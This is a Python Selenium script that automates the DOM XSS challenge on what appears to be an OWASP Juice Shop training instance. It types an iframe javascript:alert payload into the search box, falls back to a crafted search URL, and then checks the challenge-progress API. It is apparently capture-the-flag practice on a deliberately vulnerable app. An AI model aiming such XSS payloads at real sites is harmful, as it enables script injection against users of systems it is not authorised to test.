#!/usr/bin/env python3
"""
Final DOM XSS Attempt - Navigate through UI properly
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import time
import requests


def final_dom_xss_attempt():
    """Final attempt to solve DOM XSS by interacting with the search box"""
    
    print("="*60)
    print("🎯 FINAL DOM XSS ATTEMPT - UI INTERACTION")
    print("="*60)
    
    chrome_options = Options()
    # Run visible to see what's happening
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    
    driver = None
    
    try:
        print("\n1️⃣ Starting Chrome browser...")
        driver = webdriver.Chrome(options=chrome_options)
        print("   ✅ Browser started")
        
        base_url = "https://juice3.wonkatech.org"
        
        # Navigate to the main page
        print("\n2️⃣ Loading Juice Shop...")
        driver.get(base_url)
        time.sleep(3)
        
        # Dismiss any welcome banner
        try:
            dismiss_button = driver.find_element(By.CSS_SELECTOR, "button[aria-label='Close Welcome Banner']")
            dismiss_button.click()
            print("   ✅ Welcome banner dismissed")
        except:
            print("   → No welcome banner")
        
        # Dismiss cookie notice if present
        try:
            cookie_dismiss = driver.find_element(By.CSS_SELECTOR, "a.cc-btn.cc-dismiss")
            cookie_dismiss.click()
            print("   ✅ Cookie notice dismissed")
        except:
            print("   → No cookie notice")
        
        print("\n3️⃣ Finding search functionality...")
        
        # Click on the search icon to open search bar
        try:
            search_icon = driver.find_element(By.CSS_SELECTOR, "mat-icon[mattooltip='Click to search']")
            search_icon.click()
            time.sleep(1)
            print("   ✅ Search bar opened")
        except:
            print("   → Search already visible")
        
        # Find the search input field
        print("\n4️⃣ Entering XSS payload...")
        
        search_input = None
        # Try different selectors for the search box
        selectors = [
            "input#mat-input-0",
            "input[type='search']",
            "input.mat-input-element",
            "input[aria-label*='search']",
            "input[placeholder*='search']"
        ]
        
        for selector in selectors:
            try:
                search_input = driver.find_element(By.CSS_SELECTOR, selector)
                print(f"   ✅ Found search box: {selector}")
                break
            except:
                continue
        
        if search_input:
            # Clear and enter XSS payload
            search_input.clear()
            
            # The XSS payload
            payload = '<iframe src="javascript:alert(`xss`)">'
            print(f"   Payload: {payload}")
            
            search_input.send_keys(payload)
            print("   ✅ Payload entered")
            
            # Submit the search
            search_input.send_keys(Keys.RETURN)
            print("   ✅ Search submitted")
            
            time.sleep(2)
            
            # Check for alert
            print("\n5️⃣ Checking for alert...")
            
            try:
                WebDriverWait(driver, 3).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                alert_text = alert.text
                print(f"   🎉 ALERT TRIGGERED: '{alert_text}'")
                alert.accept()
                print("   ✅ Alert accepted!")
                print("\n🎉 DOM XSS SUCCESSFULLY EXECUTED!")
                
                # Wait for challenge to register
                time.sleep(5)
                
            except:
                print("   ⚠️ No alert triggered")
                
                # Try alternative - navigate directly to search with payload
                print("\n6️⃣ Alternative: Direct URL navigation...")
                
                from urllib.parse import quote
                xss_url = f"{base_url}/#/search?q={quote(payload)}"
                driver.get(xss_url)
                time.sleep(2)
                
                try:
                    alert = driver.switch_to.alert
                    print(f"   🎉 Alert triggered via URL!")
                    alert.accept()
                except:
                    print("   → No alert via URL either")
        else:
            print("   ❌ Could not find search input")
        
        print("\n⏳ Waiting for challenge registration...")
        time.sleep(5)
        
    except Exception as e:
        print(f"\n❌ Error: {str(e)}")
        
    finally:
        if driver:
            print("\n7️⃣ Closing browser...")
            driver.quit()
            print("   ✅ Browser closed")
    
    # Final status check
    print("\n" + "="*60)
    print("📊 FINAL STATUS")
    print("="*60)
    
    r = requests.get("https://juice3.wonkatech.org/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        solved = [c for c in data if c.get('solved')]
        
        # Check DOM XSS
        dom_xss = [c for c in data if 'DOM' in c.get('name', '') and 'XSS' in c.get('name', '')]
        if dom_xss and dom_xss[0].get('solved'):
            print("🎉 DOM XSS Challenge: SOLVED!")
        else:
            print("⚠️ DOM XSS Challenge: Not registered yet")
            print("\n💡 Manual verification may be needed:")
            print("   Open: https://juice3.wonkatech.org/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E")
        
        print(f"\n📊 Progress: {len(solved)}/110 ({len(solved)*100//110}%)")


if __name__ == "__main__":
    final_dom_xss_attempt()